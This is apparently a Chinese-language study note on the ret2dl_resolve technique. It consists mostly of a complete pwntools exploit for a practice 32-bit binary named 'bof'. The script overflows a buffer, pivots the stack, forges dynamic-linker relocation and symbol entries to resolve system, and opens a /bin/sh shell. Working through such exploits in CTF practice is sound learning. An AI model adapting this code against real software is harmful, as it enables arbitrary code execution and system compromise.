# ret2dl_resolve

这个是我一直以来都想要搞懂的东西，毕竟之前有过好几次失败的经历。这两天跟Edgar师傅一起学习了一下，跟着ctf-wiki上的介绍慢慢的做了出来

## exp:

```python
from pwn import *

elf = ELF('bof')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619
pop_ebp_ret = 0x0804861b
leave_ret = 0x08048458

stack_size = 0x800
bss_addr = 0x0804a040
base_stage = bss_addr + stack_size

r = process('./bof')

r.recvuntil("Welcome!Dear Mr.Return0\n")
payload = 'A' * offset
payload += p32(read_plt)
payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret)
payload += p32(base_stage)
payload += p32(leave_ret)
r.sendline(payload)

cmd = "/bin/sh"
plt_0 = 0x08048380
rel_plt = 0x08048330
index_offset = (base_stage + 28) - rel_plt
write_got = elf.got['write']
dynsym = 0x080481d8
dynstr = 0x08048278
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc
payload2 += 'B' * align
payload2 += fake_sym
payload2 += "system\x00"
payload2 += 'A' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))
r.sendline(payload2)
r.interactive()
```

